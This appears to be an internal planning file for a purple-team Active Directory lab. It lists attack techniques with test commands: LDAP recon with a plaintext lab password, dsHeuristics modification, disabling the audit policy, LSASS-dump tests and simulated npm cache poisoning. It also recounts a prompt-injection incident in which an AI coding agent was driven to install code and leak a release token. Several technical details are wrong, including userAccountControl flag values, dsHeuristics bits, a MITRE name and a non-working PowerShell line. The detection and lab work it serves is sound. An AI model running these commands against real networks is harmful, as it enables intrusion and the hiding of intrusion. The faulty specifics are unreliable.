ADeleg flags ADCS template misconfigurations (ESC1-ESC8) — per the article:
> "authenticated users have write all properties and this other stuff on this uh object in active directory this esc4 generic all certificate template we can tell that based on the distinguished name here of the object another example is uh let's see here this esc4 write owner template so we as the authenticated users have the ability to change the owner of that certificate template"

ADeleg identifies:
- ESC4 (vulnerable template ACLs — WriteOwner/WriteDacl on cert template)
- ESC1 (enrollee supplies subject + auth EKU)
- ESC2 (any purpose EKU or no EKU)
- ESC3 (enrollment agent EKU)

### 99. ADeleg — GUI Tool for ACL/ADCS Recon (Phase 0 + Branch A + Branch B) 🆕

**Tool:** ADeleg.exe (Windows GUI). https://github.com/trimarc/ADeleg
**MITRE:** T1087.002 (Account Discovery: Domain Account), T1069.002 (Permission Groups Discovery: Domain Groups), T1649 (Steal or Forge Authentication Certificates)
**Status:** 🆕 Add — Phase 0 recon (alternative to BloodHound) + Branch A (ACL Abuse visualization) + Branch B (ADCS misconfig discovery)

**Why CADRE needs it:**
1. **No setup overhead** — drop executable, run as domain user, click Connect. No SharpHound, no Neo4j, no Docker.
2. **Avoids EDR alerts** — SharpHound collector triggers many alerts; ADeleg uses natural AD queries only
3. **Visualizes our 14 ACEs** from `05-ad-attack-surface.yml` — proves the misconfigurations are deployed correctly + provides report-ready screenshots
4. **Identifies ADCS ESC1-8** in our Branch B templates — complements `certipy find`
5. **Real-world unsafe group discovery** — Domain Join accounts in CADRE may have over-permissioned ACEs (per the article: "i commonly see over permissioned")
6. **Report-ready** — GUI screenshots are easier to include than BloodHound queries

**Workflow (predicted — gated on actual tool):**
```powershell
# 1. Copy ADeleg.exe to mbr01 (or any domain-joined Windows VM)
Copy-Item .\ADeleg.exe \\mbr01\C$\Tools\

# 2. RDP to mbr01, double-click ADeleg.exe
# 3. Click "Connect" — auto-authenticates as current user
# 4. View → Index View By → Trustees
# 5. Select unsafe group (e.g., "Authenticated Users") on left
# 6. Review resources on right with "Allow" type + flagged permissions
# 7. For ADCS: View by → Resources → Certificate Templates → check ESC1-8 markers
```

**Maps to CAMPAIGNS.md:**

| CAMPAIGNS.md Phase | ADeleg Use |
|---|---|
| Phase 0 Step 7 (alternative to BloodHound) | Quick ACL/ADCS recon without Docker setup |
| Phase 4 (BloodHound) | Pre-BloodHound visual scan to verify 14 ACEs deployed correctly |
| Phase 5 Branch A (ACL Abuse — 14 ACEs) | Visual confirmation of each ACE before exploitation |
| Branch B (ADCS ESC1-17) | Visual scan of vulnerable templates before `certipy find` |
| Phase 5 Coercion | Identify delegation paths (unconstrained + constrained + RBCD) |
| Reporting | Screenshot of trustee → resources view for report evidence |

**CADRE-specific notes:**
- All 3 DCs (dc01, dc02, dc03) domain-joined, have 14 ACEs configured per `05-ad-attack-surface.yml`
- All 3 forests have ADCS CA (cadre-CA per `08-adcs-deploy.yml`) with ESC1-17 templates
- mbr01 + mbr02 are domain-joined member servers — run ADeleg from either
- DC computer objects have over-permissioned defaults — ADeleg would surface these
- The "domain join" over-permission pattern from the article applies to CADRE's mbr01$ and mbr02$

**Detection (ADeleg reconnaissance):**
- **WinSec 4662** (DS Object Access) — high volume of ACL reads in short period
- **WinSec 4624** Type 3 (Network logon) for ADeleg's auth
- **Zeek LDAP queries** — bulk `searchRequest` with `(objectClass=*)` from a single source
- **Sysmon EID 1** — `ADeleg.exe` process creation (process name visible)
- **Suricata SID (new, propose 1000102)** — bulk LDAP queries from single source

**Cross-references:**
- Phase 4 (BloodHound) — alternative when SharpHound collector is blocked by EDR
- Branch A (ACL Abuse — 14 ACEs) — visual confirmation
- Branch B (ADCS ESC1-17) — visual scan of vulnerable templates
- Item #29 (UnPAC-the-Hash — NT hash from certificate via U2U) — ADeleg identifies the certificates
- Item #60 (ADIDNSDump) — complementary recon

**Status:** 🆕 Ready — tool is freely available, no install needed, GUI runs as domain user. Test on mbr01 first (domain-joined, less critical than DCs).

---

## Concrete Techniques Extracted from Reference Books (2026-06-24)

Per workflow principle (user 2026-06-24): *books are reference material, but specific attack techniques IN them should be extracted as new items in Campaign_suggestions, with phase mapping. Only move to CAMPAIGNS.md Mechanics when verified.*

This section extracts 5 concrete techniques from Windows Security Internals + Practical Purple Teaming that aren't in our current campaign.

### 102. dsHeuristics Abuse (Forest-Level AD Behavior Attribute) 🆕 ⏳

**Source:** Windows Security Internals (Forshaw) Ch 11. Reference: `dsHeuristics` attribute documented in [MS-ADTS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/) and Microsoft KB article 269190.
**MITRE:** T1078.002 (Valid Accounts: Domain Accounts), T1562.008 (Disable Cloud Accounts — variant)
**Phase:** Phase 0 (Recon) — find dsHeuristics value
**Status:** 🆕 NEW — add to Campaign_suggestions

**Why CADRE needs it:**
- `dsHeuristics` is a forest-level attribute that controls various AD behaviors
- Some settings weaken security significantly:
  - `fAllowAnonNSPIUpdates` (bit 7 = `00000080`) — allows anonymous LDAP updates
  - `fAllowDelegatedInstallers` (bit 6 = `00000040`) — allows delegated installer permissions
  - `fDisableListContents` (bit 1 = `00000002`) — disables listing of OU contents (helps hide objects)
- Used in some advanced AD attack chains — e.g., hiding created objects from defensive enumeration

**Maps to:**
- **Phase 0 (Recon)** — read dsHeuristics value via LDAP, document unusual flags
- **Phase 5+ (Defense Evasion)** — modify dsHeuristics to hide attacker-created objects (red team perspective)

**Test plan (Phase 0 read):**
```powershell
# From mbr01 as domain user
Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=cadre,DC=local" -Properties dsHeuristics
# Or via nxc:
nxc ldap dc01.cadre.local -u user -p pass -q "(objectClass=ntDSService) attributes dsHeuristics"
```

**Test plan (Phase 5+ modify — gated on write perms):**
```powershell
# Requires DS-Replication-Get-Changes-All + DS-Replication-Get-Changes (DCSync rights) OR equivalent
Set-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=cadre,DC=local" -Add @{dsHeuristics="0000002"}
```

**Detection:**
- WinSec 5136 (Directory Service Changes) — fires on dsHeuristics modification
- LDAP query for `dsHeuristics` attribute changes
- Suricata new SID (propose 1000103) — LDAP modify on Configuration partition
- Zeek `ldap.log` — modify operations against CN=Directory Service

**Cross-references:** Item #100 (Windows Security Internals) — Ch 11 reference. Plan 1.7 detection engineering.

---

### 103. User-Account-Control Bit Exploitation Beyond DONT_REQ_PREAUTH 🆕 ⏳

**Source:** Windows Security Internals (Forshaw) Ch 10 + Ch 11. Reference: [MS-ADTS userAccountControl](https://learn.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol).
**MITRE:** T1078.002 (Valid Accounts), T1558.003 (Steal or Forge Kerberos Tickets), T1558.005 (Ccache Abuse)
**Phase:** Phase 0 (Recon) + Phase 1 (AS-REP) + Phase 5 (Delegation)
**Status:** 🆕 NEW — add to Campaign_suggestions

**Why CADRE needs it:**
The `userAccountControl` attribute has many flags beyond the well-known `DONT_REQ_PREAUTH` (0x400000). Each enables a different attack:
- `TRUSTED_FOR_DELEGATION` (0x80000) → unconstrained delegation attack (we have WT062)
- `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x40000) → protocol transition (RBCD/S4U2Self abuse, WT007)
- `DONT_EXPIRE_PASSWORD` (0x10000) → password never expires (credential reuse longevity)
- `DONT_REQ_PREAUTH` (0x400000) → AS-REP roastable (we have WT003)
- `ENCRYPTED_TEXT_PWD_ALLOWED` (0x128) → legacy reversible encryption
- `SMARTCARD_REQUIRED` (0x40000) + `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x40000) → smartcard bypass + delegation
- `NOT_DELEGATED` (0x100000) → blocks delegation but often missing on service accounts

**CADRE applicability:**
- Map all 20+ UAC flags in our lab
- Identify accounts with exploitable flag combinations
- Currently our campaign only documents AS-REP roast (0x400000) — many other flags are unenumerated

**Test plan (Phase 0 recon):**
```powershell
# Enumerate all UAC flags for users
Get-ADUser -Filter * -Properties userAccountControl | Select-Object sAMAccountName, userAccountControl, @{N='Flags';E={[FlagsBitwise]::Format([Enum]::GetValues([ADS_USER_FLAG_ENUM]), $_.userAccountControl)}}

# Or via NetExec:
nxc ldap dc01.cadre.local -u user -p pass -q "(objectClass=user)" userAccountControl sAMAccountName
```

**Detection:** Same as Phase 1 — WinSec 4662 for ACL reads + LDAP query pattern.

**Cross-references:** Item #100 (Windows Security Internals). WT003 (AS-REP — already in). WT062 (unconstrained delegation — already in). WT007 (RBCD — already in).

---

### 104. ms-DS-Machine-Account-Quota Check (RBCD Pre-Flight) 🆕 ⏳

**Source:** Windows Security Internals (Forshaw) Ch 11. Reference: [MS-ADTS ms-DS-Machine-Account-Quota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machine-account-quota).
**MITRE:** T1136.002 (Create Account: Domain Account)
**Phase:** Phase 5 (RBCD path pre-flight — before WT007)
**Status:** 🆕 NEW — add to Campaign_suggestions

**Why CADRE needs it:**
- `ms-DS-Machine-Account-Quota` defaults to **10** — any domain user can join up to 10 computers
- RBCD attacks (WT007) require creating a fake computer object → relies on this quota
- **Quota = 0** (hardened configs) = blocks RBCD from low-priv users
- **Pre-flight check** before attempting RBCD path — saves time if blocked

**CADRE-specific check:**
- Verify what quota CADRE has configured
- Document the path: if quota > 0, RBCD works; if quota = 0, RBCD requires alternative computer creation (e.g., via ACE#18 abuse)

**Test plan:**
```powershell
# From mbr01 as standard user (e.g., intern_blue)
Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ms-DS-Machine-Account-Quota
# Should return: ms-DS-Machine-Account-Quota : 10 (default)

# Or via NetExec:
nxc ldap dc01.cadre.local -u intern_blue -p '1nt3rn_Blu3!' -q "(objectClass=domain)" ms-DS-Machine-Account-Quota
```

**If quota = 0:** RBCD path blocked. Use alternative computer creation (e.g., abuse ACE#18 to reset service account password, then create computer with that account).

**Detection:** Same as WT007 (computer creation). WinSec 4741 (Computer Object Created).

**Cross-references:** WT007 (RBCD — already in). Item #100 (Windows Security Internals). Branch A Path C (computer object creation).

---

### 105. SACL / Audit Policy Manipulation for Detection Evasion 🆕 ⏳

**Source:** Windows Security Internals (Forshaw) Ch 9. Reference: [MS-ADTS audit policy](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy).
**MITRE:** T1562.002 (Impair Defenses: Disable Windows Event Logging)
**Phase:** Phase 5+ (red team perspective — post-exploitation stealth)
**Status:** 🆕 NEW — add to Campaign_suggestions

**Why CADRE needs it:**
- SACLs on AD objects control which operations generate 4662 audit events
- Default SACL coverage is often minimal
- **Attackers (red team perspective):** modify SACLs to suppress audit events before sensitive operations
- **Defenders (plan1.7):** detect SACL modifications as early-warning signal

**Test plan (red team):**
```powershell
# Disable audit policy on a specific OU (requires admin)
auditpol /set /category:"DS Access" /success:disable /failure:disable
# OR: modify dsHeuristics to suppress audit
# OR: clear SACL on specific computer objects
```

**CADRE-specific note:** We're running defensive, not red team. This item maps to **plan1.7 detection engineering** (we want to DETECT these manipulations), not to a campaign attack step.

**Detection:**
- WinSec 4907 (Audit policy changes)
- WinSec 4719 (System audit policy was changed)
- Event Tracing for Windows (ETW) — kernel-level audit changes
- Suricata new SID (propose 1000104) — suspicious SACL/audit policy modification
- Elastic KQL (proposed cadre-008): `event.code:4907 OR event.code:4719`

**Cross-references:** Item #100 (Windows Security Internals). plan1.7 detection engineering. Branch A Path C (cleanup).

---

### 106. Atomic Red Team as Validation Framework (Cross-Cutting) 🆕 ⏳

**Source:** Practical Purple Teaming (Petrey) Ch 8. Reference: [Atomic Red Team GitHub](https://github.com/redcanaryco/atomic-red-team).
**MITRE:** Cross-cutting — maps to all 14 MITRE ATT&CK tactics
**Phase:** Cross-cutting — run after each phase to validate detection coverage
**Status:** 🆕 NEW — add to Campaign_suggestions

**Why CADRE needs it:**
- Atomic Red Team = 1000+ pre-built attack tests mapped to MITRE ATT&CK
- PowerShell + bash + Python execution agents
- **Validates detection rules** — runs attacks in test environment, verifies Suricata/Zeek/Elastic actually fire
- **Cross-validation of our manual CAMPAIGNS.md commands** — confirm our manual attacks produce same telemetry as Atomic Red Team canonical version

**CADRE applicability:**
- Deploy Atomic Red Team on mbr01 + mbr02
- Run all attacks that map to our CAMPAIGNS.md techniques
- Cross-check our `tracker.md` output vs Atomic Red Team output
- Closes coverage gaps (if Atomic Red Team has attacks we don't, add them)

**Test plan:**
```powershell
# On mbr01 as administrator
Invoke-AtomicTest T1003.001 -ShowDetails
# Run LSASS dump test, verify our WinSec 4662 detection fires

# Or batch run:
Invoke-AtomicTest T1003.001, T1558.003, T1003.006 -ShowDetails
```

**Cross-references:** Item #101 (Practical Purple Teaming) — Ch 8 reference. Track B (Caldera integration). plan1.7 detection validation. Per-phase `tracker.md` updates.

---

## GitHub Actions Supply-Chain Attack Patterns (Flatt Security, 2026-06-24)

**Source:** [GMO Flatt Security Blog — GitHub Actions Initial Access Part 1](https://blog.flatt.tech/entry/2026-github-actions-security-part1) by Sato (@Nick_nick310), 2026-06-24. 4-part series on GitHub Actions security. Part 1 covers Initial Access techniques derived from real-world compromises (Ultralytics, nx, tj-actions/changed-files, trivy, cline).

**Why relevant for CADRE:**
- **Plan 0.8 (Supply-Chain Emulation) expansion** — current scenarios F-01 to F-10 cover npm-side attacks. This article introduces **CI/CD-side** attack patterns that lead to the npm publish step in our chain. Specifically: **F-11 cache poisoning** and **F-12 tag pollution** complete the full kill chain.
- **CADRE-Strike (Track H) defensive guardrails** — the cline incident uses `anthropics/claude-code-action` which is the same tool class we'll deploy for CADRE-Strike. Article provides concrete defense checklist (`allowed_non_write_users`, `--allowedTools` scoping, `permissions` minimization, commit-hash pinning).
- **MITRE T1195.001** — explicitly frames "supply-chain compromise via CI/CD" as initial-access vector. Maps to our existing Plan 0.8 framing.
- **Cache poisoning chain** — cline attack shows attacker → Issue prompt injection → AI agent `npm install` → cache poison → nightly release workflow → `NPM_RELEASE_TOKEN` exfil. This is the exact pattern that turns an isolated PR into a registry-wide compromise.

**3 attack patterns (MITRE T1195.001 initial access):**

1. **Vulnerable trigger configuration injection** — `pull_request_target` + `actions/checkout@${{ github.event.pull_request.head.sha }}` + `npm install` = arbitrary code via preinstall script. Real-world: Ultralytics (Dec 2024), nx (Aug 2025).
2. **Tag pollution** — move `@v1` or `@v1.2.3` to a malicious commit. **Imposter Commits** (reference fork commit hash as if parent repo) amplify this. Real-world: tj-actions/changed-files (Mar 2025), trivy twice (Feb + Mar 2026).
3. **AI agent over-permissioning** — `allowed_non_write_users: "*"` + `--allowedTools Bash` + Issue title prompt injection = arbitrary `npm install`. Real-world: cline (Feb 2026) → malicious `cline@2.3.0` published.

**MITRE ATT&CK mapping:**
- **T1195.001** Supply Chain Compromise: Compromise Software Dependencies and Development Tools
- **T1554** Compromise Client Software Binary
- **T1195.002** Compromise Software Supply Chain (for npm publish side)

**Detections (for plan1.7 §17 — held):**
- WinSec 4624 Type 3 (Network Logon) from runner IPs after build
- WinSec 4663 file access on `C:\actions-runner\_work\*\.npmrc` or `.npm/_cacache`
- Zeek HTTP POST to npm registry from build runner IP during `npm publish` window
- Zeek DNS queries to unexpected package mirror domains from runner
- Suricata SID (proposed): TLS anomaly — outbound to non-corporate npm mirror during build

### 107. GitHub Actions Supply-Chain Attack Patterns (Plan 0.8 expansion + CADRE-Strike guardrails) ⏳

**Status:** ⏳ NEW (2026-06-24 session 11). Source: Flatt Security blog Part 1. Maps to **Plan 0.8** (Supply-Chain) as F-11/F-12 and **Track H** (CADRE-Strike) as defensive guardrails.

**Campaign location:** Branch F — Plan 0.8 expansion (F-11 cache poisoning, F-12 tag pollution analog). NOT part of main spine (no GitHub Actions in our AD lab). Belongs to **Track H** (CADRE-Strike defensive checklist) when sister repo integration begins.

**Phase mapping:**
| Phase | Application |
|---|---|
| Plan 0.8 (Supply-Chain Emulation) | F-11 cache poisoning + F-12 tag pollution analog as new scenarios |
| Phase 5+ (Persistence) | Cache poisoning → nightly release → persistent registry access (theory) |
| Track H (CADRE-Strike) | Defensive guardrails — `allowed_non_write_users`, `--allowedTools` scoping, commit-hash pinning |

**CADRE applicability (Plan 0.8 expansion):**
- **F-11 Cache Poisoning:** Stage a poisoned `~/.npm/_cacache` via malicious `npm install` in PR-triggered workflow. Subsequent release workflow uses poisoned cache. Equivalent attack vector for npm — analogous to GitHub Actions cache poisoning.
- **F-12 Tag Pollution analog:** npm doesn't support Git-style tag rewriting cleanly, but `--tag` flag on `npm publish` + later `npm dist-tag add <pkg>@<ver> <newtag>` can simulate. Maps to Plan 0.8 npm scenario.
- **Detection engineering (held for plan1.7 §17):**
  - Sysmon EID 1 — `npm publish` from non-standard directory
  - Zeek HTTP POST volume from build runner IPs to npm registry
  - WinSec 4663 — access to `.npm/_cacache/index.json` outside normal install workflow

**CADRE applicability (CADRE-Strike defensive guardrails — Track H):**
When integrating `anthropics/claude-code-action` for CADRE-Strike automation:
- **NEVER** set `allowed_non_write_users: "*"` — restrict to maintainers only
- **NEVER** pass bare `Bash` to `--allowedTools` — scope to `'Bash(npm run test:*)'` etc.
- **ALWAYS** pin external actions to commit hash (not `@v4`)
- **ALWAYS** set minimal workflow `permissions:` (don't rely on default `contents: write`)
- **ALWAYS** validate artifacts via `path:` + delimiter syntax on `GITHUB_OUTPUT`
- **OR** keep workflow AI agent isolated to a non-secret job (no `secrets:` access)

**Test plan (Plan 0.8 — when expanded):**
```bash
# On linux01 (Plan 0.8 supply-chain lab)

# F-11: Cache poisoning simulation
mkdir -p ~/.npm/_cacache
# Stage poisoned package metadata
npm install --cache ~/.npm/_cacache /tmp/attacker-payload.tgz
# Next workflow run uses poisoned cache

# F-12: Tag pollution analog
npm publish /tmp/malicious-pkg.tgz --tag latest
npm dist-tag add malicious-pkg@1.0.0 stable  # move to known-good tag
```

**Test plan (CADRE-Strike guardrails — when sister repo created):**
- Create test workflow with `allowed_non_write_users: "*"` + `--allowedTools Bash` — verify attack succeeds (cline-style)
- Apply minimum-privilege config — verify attack fails
- Document the difference as a Track H scenario

**Defenses (from article + extension to Plan 0.8):**
- **GitHub Actions side:** Pin to commit hash. Use `pull_request` not `pull_request_target` when possible. Validate artifacts. Intermediate env vars for external context. Minimal permissions everywhere.
- **npm side (Plan 0.8 analog):** Pin package versions exactly (`"pkg": "1.2.3"`, not `"^1.2.3"`). Use lockfiles (`package-lock.json`). Audit `npm install --dry-run` in CI. Use Sigstore/npm provenance verification (TUF + sigstore-js).
- **CADRE-Strike side:** Follow cline post-mortem hardening checklist above. Consider GitHub Agentic Workflows (new secure architecture).

**Why supersedes nothing:** This is a NEW track (Plan 0.8 expansion + Track H defensive). Does NOT supersede any existing item.

**Workflow note (2026-06-24 session 11):** Per user direction "Do it" — adding Item #107 with full Campaign_suggestions entry. Mechanics stub will go to CAMPAIGNS-METADATA.md (not main CAMPAIGNS.md — no GitHub Actions in our AD lab, so F-11/F-12 are Plan 0.8 expansion topics).

**Status legend for new item:** ⏳ Pending — held for Plan 0.8 expansion or Track H (CADRE-Strike) integration.

**Cross-references:**
- **Plan 0.8** (`docs/internal/npm-supplychain-installation-guide.md`) — F-01 through F-10 already deployed. F-11/F-12 expand the chain.
- **Track H** (Campaign_suggestions.md §"Track H - CADRE-Strike") — defensive guardrails when sister repo created
- **Item #98 (NetExec)** — `--kdcHost` flag fixes Phase 1/2 Kerberos routes (unrelated but adjacent tool class)
- **External reference #124+** (held) — add to `docs/internal/plan01-upgrades/external-references.md`
- **plan1.7 §17** (held) — detection rules for cache poisoning + tag pollution

---

### Items NOT to add to CAMPAIGNS.md (per current scope)

Per user direction (2026-06-24): **All 8 items in #98 already updated in CAMPAIGNS.md**:
- `--kdcHost` flag added to Step 0.5, Phase 1 AS-REP, Phase 2 Kerberoast
- `coerce_plus` added as Phase 5 WT096 (with full Mechanics section)
- 5 new modules referenced in Step 0.5 recon (pre2k, enum_av, get-desc-users)
- 3 new modules referenced in Phase 3.5 (winscp, dpapi, rdp)
- DCSync detection property GUID added to Study Reference Library

Detection engineering for the new modules → plan1.7 §17 (paired with CVE-2026-41089 rules).

---

## Next Actions / Parallel Tracks (After Campaign Verification)

These are high-level tracks to pursue **after** the primary campaign (Phases 0-8 + Branches) is fully verified end-to-end. Do not start these until campaign validation is complete.

### Track A — Hardened Environment Variant

**Trigger:** After campaign Phase 1-8 fully verified with current (weakened) config.
**Source:** CVE-2026-20833 (Kerberos RC4 hardening), Server 2025 full security posture.
**What:** Create a "hardened mode" variant that tests only techniques surviving full security + fully updated Server 2025.

**Key findings from analysis:**
- **~87% survival rate** (66/76 attacks still work)
- **Phase 2 (Kerberoast) is DEAD** — RC4 enforcement (July 2026) kills RC4-encrypted TGS cracking. AES256 impractical for strong passwords.
- **Phase 3.5 is ~27%** — LSASS PPL + Credential Guard blocks 7/11 techniques (3.5F, 3.5K, 3.5A, 3.5G, 3.5H, 3.5I, 3.5B/3.5C need password)
- **Golden/Silver Ticket forging impacted** — RC4 dead, AES much harder
- **What survives:** AS-REP Roast, SQL xp_cmdshell, GodPotato, LAPS extraction, Azure AD Connect dump, all Phase 4-8 (DCSync, RBCD, ADCS, SCCM, forest trust)

**Revised hardened attack path:**
```
Phase 1: AS-REP → intern_blue
Phase 2.5: ACE#18 → analyst_t2
Phase 3: SQL xp_cmdshell → GodPotato → SYSTEM
Phase 3.5: LAPS (if permissions) OR Azure AD Connect dump (dc01)
Phase 4-8: DCSync, RBCD, ADCS, forest trust (all work)
```

**Action items (future):**
1. Enable LSASS PPL, Credential Guard, RC4 enforcement, SMB signing, Defender
2. Re-run campaign → document which attacks break
3. Build detection rules for hardened-environment-only attacks
4. Document "what a real hardened environment looks like" vs our lab

### Track B — Automated Adversary Emulation (Caldera)

**Trigger:** After campaign Phase 1-8 verified manually.
**Source:** SEC699 (Advanced Purple Team Tactics).
**What:** Deploy MITRE Caldera + VECTR. Automate all 75 campaign attacks. Track detection coverage.

**Action items (future):**
1. Deploy Caldera on provisioning (Docker)
2. Deploy VECTR on provisioning (Docker)
3. Create Caldera adversary profile for all 75 attacks
4. Run automated emulation → record results in VECTR
5. Build Sigma rules for undetected techniques
6. Re-validate detection coverage

### Track C — Sigma Rule Library

**Trigger:** After campaign Phase 1-8 telemetry captured.
**Source:** SEC555 + FOR608.
**What:** Build portable Sigma rules for all 75 campaign attacks. Map to MITRE ATT&CK.

**Action items (future):**
1. Extract telemetry from tracker.md (WinSec, Suricata, Zeek, Sysmon, Endpoint)
2. Write Sigma rule for each attack
3. Convert to Elastic KQL
4. Import into Elastic as detection rules
5. Test against campaign traffic
6. Export as portable Sigma format

### Track D — NSM Dashboards (Kibana)

**Trigger:** After campaign Phase 1-3 telemetry captured.
**Source:** SEC555 + SEC511.
**What:** Build 6 Kibana dashboards for network security monitoring.

**Action items (future):**
1. DNS Overview (zeek.dns)
2. HTTP Overview (zeek.http)
3. TLS Overview (zeek.ssl)
4. Kerberos Overview (zeek.kerberos)
5. SMB Overview (zeek.smb)
6. Flow Overview (zeek.conn)

### Track E — Forensic Tooling (KAPE + Volatility + Timeline)

**Trigger:** After campaign Phase 3.5 completes.
**Source:** FOR500 + FOR508 + FOR608.
**What:** Install forensic tools. Build triage + timeline workflows.
**Orchestrator:** [`DFIR-Nexus-Pioneer-workflow.md`](DFIR-Nexus-Pioneer-workflow.md) — Pioneer loop (attack → export → DFIR-Nexus case → tracker). Expands to KAPE/Plaso in B.0/C.0.

**Action items (future):**
1. Install KAPE, Eric Zimmerman tools, Volatility on Windows VMs
2. Install Plaso + Timesketch on provisioning
3. Run KAPE triage after each campaign phase
4. Build supertimelines from triage data
5. Analyze with Volatility for memory artifacts

### Track F — Plan 11 (Cloud/Entra ID)

**Trigger:** After campaign Phase 8 completes.
**Source:** Dirk-jan Mollema blog + FOR509.
**What:** EntraGoat integration. Test Azure/Entra ID attack techniques.

**Action items (future):**
1. Deploy EntraGoat environment (Azure free tenant)
2. P11.8: Azure AD Connect DPAPI dump (bridge from Phase 3 SYSTEM)
3. P11.1: Actor Tokens → Global Admin
4. P11.2: Cloud Kerberos Trust → Domain Admin
5. P11.3: PRT Phishing
6. Build detection rules for cloud attacks

---

### Track G — UnCanny + Future Windows 0days (0xHossam, 2026-06-19)

**Trigger:** After primary campaign (Phases 0-8 + Branches) fully verified. Or when next significant Windows 0day emerges.
**Source:** https://github.com/0xHossam/UnCanny + SANS ISC diary 33090
**Status:** 🔬 Documented, deferred test (per user 2026-06-19)

**What:** New NTLM coercion primitive (machine account) + LPE 0day (non-admin → SYSTEM) using Windows Store InstallService loose-file AppX registration.

**Why deferred:**
1. **Gating factor: Developer Mode** — `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1` required. Enabling in `00-domain-deploy.yml` is an admin change to the playbook — separate decision.
2. **Not on critical path** — existing WT017 (PrinterBug) coercion works on CADRE; UnCanny is a parallel technique for hardening-variation testing.
3. **Detection rules already deployed** — Suricata SID 1000095-1000097 + Elastic KQL in plan1.7 §14 are written and ready; can be deployed before testing.

**What IS done (2026-06-19):**
- ✅ Cloned to `references/uncanny/UnCanny/` (1.1 MiB, source only)
- ✅ WT094 + 3.5N entries in CAMPAIGNS.md (Phase 5 + Branch 3.5) with full test plans
- ✅ plan1.7 §14 detection rules written
- ✅ External references #108, #109 added

**When to revisit:**
- During Track A (Hardened Environment Variant) — UnCanny is exactly the kind of technique that may still work on hardened targets (AppX abuse bypasses many hardening controls)
- After campaign Phase 8 completes — if you have time/interest
- When a new Windows 0day emerges (this track becomes a recurring pattern: clone → analyze → document → defer → add to playbook hardening later)

**Companion project:** Project NightCrawler (`references/project-nightcrawler/`) follows the same deferred pattern. Both are "off-online-campaign" Windows vulnerability research that feeds back into:
- Detection rules (plan1.7)
- Hardened variant track (Track A)
- Future attack surface (when new playbooks are written)

**Action items (future):**
1. Verify Developer Mode status on dc01/mbr01/mbr02 (just informational, not blocking)
2. Decide whether to enable Developer Mode in `00-domain-deploy.yml` (admin change)
3. If yes, patch impacket per author's setup.sh, deploy detection rules, then run UnCanny
4. If no, keep UnCanny as documentation-only and revisit during Track A (Hardened Environment)

---

### Track H — CADRE-Strike: Agentic Offense Automation (Parallel to Campaign) 📋 TRACKED

**Trigger:** After campaign Phase 1-8 + branches fully verified end-to-end. May run in parallel during Track A (Hardened Environment) or Track B (Adversary Emulation).
**Source:** https://github.com/0xABCD01/CADRE-Strike (separate repo at `C:\STUDY\Github\CADRE-Strike\`). MIT license. ~30 files, ~10K LOC (MVP 0.1).
**Status:** 📋 Tracked — deferred integration until campaign testing complete. Per user 2026-06-24: "optional approach parallel to campaign we are verifying. For now we keep this recorded somewhere in campaign-suggestions.md/changelog/agents.md so we can comeback to it once the compaign testing is complete."

**What is CADRE-Strike:**
**CADRE = Contextual Active Directory Reasoning Engine.** Parallel agentic offense layer that drives the existing campaign tooling (NetExec, bloodyAD, Certipy, Coercer, Impacket) the same way the HexStrike AI article showed for Claude + NetExec. The differentiator from "command-pass-through" wrappers (HexStrike AI, etc.):

- **Intent-level operations**, not raw shell commands: `enumerate_domain_users`, `find_delegation`, `find_asrep_roastable`, `enumerate_adcs` — semantic operations an LLM agent can reason about
- **Typed command builders** with `shell=False` (no shell injection)
- **Scope policy enforcement** before every action: target IP/CIDR + domain allowlist + engagement mode + high-risk gate
- **Pydantic-typed evidence records** with MITRE ATT&CK mapping, automatic secret redaction (`SecretStr`), confidence scoring
- **Read-only by default**: no spraying, dumping, persistence, or account changes in MVP
- **Dual interface**: HTTP API (`cadre-api` on :8890) + MCP server (`cadre-mcp`) for AI agent integration
- **NetworkX-based graph reasoning** planned (per ROADMAP.md 0.2)

**Roadmap (from CADRE-Strike/ROADMAP.md):**
- **0.1 MVP (current)**: Read-only API + MCP + NetExec command builder + evidence model + scope policy + 5 test files
- **0.2 AD Reasoning** (next): BloodHound JSON import + LDAP enrichment + ranked attack-path graph + MITRE mapping
- **0.3 Validation Mode**: Explicit approval for high-risk operations (spray, ADCS ESC validation, LAPS/gMSA read)
- **0.4 Operator UX**: Web dashboard for scope + evidence + graph + report generation

**CADRE mapping (when integration starts):**
| CADRE-Strike tool | Maps to CAMPAIGNS.md attack |
|---|---|
| `enumerate_domain_users` | Phase 0 Step 2 (Kerberos user enum) |
| `find_asrep_roastable` | Phase 1 (WT003 AS-REP roast) |
| `find_kerberoastable` | Phase 2 (WT002 Kerberoast via ACE#18) |
| `enumerate_password_policy` | Phase 0 (pre-spray safety check) |
| `enumerate_shares` | Phase 0 (lateral surface) |
| `find_delegation_paths` | Phase 5 (delegation abuse — unconstrained + constrained + RBCD) |
| `find_admin_count_accounts` | Phase 6 (DA discovery via AdminSDHolder) |
| `enumerate_adcs` | Branch B (ADCS ESC1-17) |
| `enumerate_domain_groups` | Phase 0 (BloodHound seed) |
| `enumerate_domain_computers` | Phase 0/8 (cross-forest prep) |

**Why optional / parallel (not in main spine):**
1. Main campaign is verified manually for **reproducibility** (ground truth for telemetry rules). CADRE-Strike is the automation layer for **scaling + AI agent evaluation**.
2. Per the 2026 industry trend (HexStrike AI, BloodHound MCP, BARK), AI agents driving AD tools is the next research frontier.
3. Same CADRE 3-forest lab topology = both manual and agentic runs use identical attack surface.
4. Need clear separation between manual and agentic results during telemetry capture.

**Companion pattern (already proven):** DFIR-Nexus (`tools/dfir-nexus/`) is the agentic DFIR side. CADRE-Strike would be the agentic offense side. Both pair with the manual campaign via `tracker.md`.

**Future documentation (per user 2026-06-24):**
- Create `attack-matrix/CADRE-Strike-workflow.md` (parallel to `DFIR-Nexus-Pioneer-workflow.md`) when integration starts
- Map 0.1 → 0.4 roadmap to CAMPAIGNS.md phases (Phase 0 recon → Phase 8 cross-forest)
- Add Codex Security (or equivalent LLM) integration point: LLM picks next tool → MCP server dispatches → evidence captured
